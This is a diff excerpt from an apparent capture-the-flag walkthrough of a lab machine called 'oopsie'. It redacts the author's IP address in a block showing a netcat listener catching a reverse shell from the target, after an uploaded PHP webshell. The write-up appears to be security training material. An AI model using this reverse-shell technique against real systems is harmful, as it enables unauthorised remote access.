@@ -158,7 +158,7 @@ We found the 'uploads' folder. Now, we are going to set up a listener and visit 
 ┌─[parrot@parrot]─[/usr/share/webshells/php]
 └──╼ $nc -lvnp 1234
 listening on [any] 1234 ...
-connect to [10.10.15.11] from (UNKNOWN) [10.129.245.13] 46544
+connect to [MY ADRESS IP] from (UNKNOWN) [10.129.245.13] 46544
 Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
  21:11:56 up  1:55,  0 users,  load average: 0.00, 0.00, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
